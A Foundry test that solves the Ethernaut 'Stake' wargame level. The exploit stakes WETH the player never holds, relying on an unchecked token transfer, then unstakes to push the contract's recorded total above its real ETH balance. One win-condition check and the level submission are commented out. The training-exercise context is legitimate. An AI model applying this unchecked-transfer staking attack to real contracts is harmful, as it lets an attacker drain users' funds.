// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

interface IStaker {
  function totalStaked() external returns (uint256);
  function UserStake(address) external returns (uint256);
  function Stakers(address) external returns (bool);
  function WETH() external returns (address);

  function StakeETH() external payable;
  function StakeWETH(uint256 amount) external returns (bool);
  function Unstake(uint256 amount) external returns (bool);
}

interface IWETH {
  function approve(address spender, uint256 amount) external;
}

contract StakeTest is Test {
  address private constant playerAddress = address(uint160(uint256(keccak256(abi.encodePacked("PLAYER")))));
  address private challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x32FFB8d4244B350F5D3E074e9b731A135531B975);
  }

  function testExploit() public {
    // Part of the game.
    // See:
    // https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/test/levels/Stake.t.sol
    // We need less, though
    vm.deal(playerAddress, 0.001 ether + 1 wei);
    vm.startPrank(playerAddress);

    address wethAddress = IStaker(challengeAddress).WETH();
    IWETH(wethAddress).approve(challengeAddress, type(uint256).max);

    // Make stakeAddress.balance != 0
    IStaker(challengeAddress).StakeETH{value: 0.001 ether + 1 wei}();

    // Stake unexisting funds
    // (We do not have 0.001 ether + 1 wei in WETH)
    IStaker(challengeAddress).StakeWETH(0.001 ether + 1 wei);

    // Trigger Unstake to flush our UserStake, but without receiving the funds
    IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);
    /// IStaker(challengeAddress).Unstake(0.001 ether + 1 wei);

    // Check the winning conditions
    // - The `Stake` contract's ETH balance has to be greater than 0.
    assertNotEq(challengeAddress.balance, 0);
    // - totalStaked must be greater than the Stake contract's ETH balance.
    assertGt(IStaker(challengeAddress).totalStaked(), challengeAddress.balance);
    // - You must be a staker.
    assertTrue(IStaker(challengeAddress).Stakers(playerAddress));
    // - Your staked balance must be 0.
    // assertEq(IStaker(challengeAddress).UserStake(playerAddress), 0);

    vm.stopPrank();

    // utils.submitLevelInstance(challengeAddress);
  }

  fallback() external payable {
    revert("not receiving these funds");
  }
}
